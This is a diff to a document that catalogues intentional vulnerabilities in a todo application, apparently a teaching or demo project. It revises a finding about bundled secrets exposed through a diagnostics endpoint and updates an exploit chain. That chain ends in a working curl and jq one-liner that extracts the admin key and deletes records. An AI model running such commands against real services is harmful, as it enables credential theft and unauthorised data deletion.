@@ -81,11 +81,8 @@ contrived examples — each one has been observed in production systems.
 - **File:** [`infrastructure/cloud_run.tf`](../infrastructure/cloud_run.tf) — `APP_CONFIG_SECRETS` env var
 - **File:** [`infrastructure/secrets.tf`](../infrastructure/secrets.tf) — `todo_secrets_v1`
 - **OWASP:** A04 Cryptographic Failures / A02 Security Misconfiguration
-- **Flaw:** Multiple secrets (`admin_api_key`, `jwt_secret`) are bundled into one JSON
-  blob and mounted as a single env var (`APP_CONFIG_SECRETS`). Any process that can
-  read env vars gets all secrets at once.
-- **Risk:** A single point of compromise exposes every secret. Env vars are also
-  visible via `/proc/1/environ`, memory dumps, and the diagnostics endpoint.
+- **Flaw:** Multiple credentials (database credentials, JWT signing key, admin API key, SaaS tokens) are bundled into one JSON blob and mounted as a single environment variable (`APP_CONFIG_SECRETS`).
+- **Risk:** High blast radius. A single point of compromise exposes every system credential at once (database, auth, external APIs). Environment variables are also visible via `/proc/1/environ`, memory dumps, and the diagnostics endpoint.
 
 ---
 
@@ -96,14 +93,14 @@ The flaws above chain together into a complete exploit:
 ```
 V-PLT-01 (DEBUG=true in Terraform)
     → enables V-APP-03 (diagnostics endpoint publicly accessible)
-        → exposes V-PLT-02 (APP_CONFIG_SECRETS JSON blob)
-            → reveals V-APP-01 (admin key)
+        → exposes V-PLT-02 (APP_CONFIG_SECRETS JSON blob with DB, JWT, and Admin keys)
+            → extracts V-APP-01 (admin key)
                 → allows authenticated DELETE of any todo item
 ```
 
 ```bash
 # Full exploit in one command
-KEY=$(curl -s "$SERVICE_URL/api/v1/system/diagnostics" | jq -r '.environment_variables.TODO_ADMIN_KEY')
+KEY=$(curl -s "$SERVICE_URL/api/v1/system/diagnostics" | jq -r '.environment_variables.APP_CONFIG_SECRETS | fromjson | .admin_api_key')
 
 curl -i -X DELETE "$SERVICE_URL/api/v1/todos/1" -H "X-Admin-Key: $KEY"
 ```
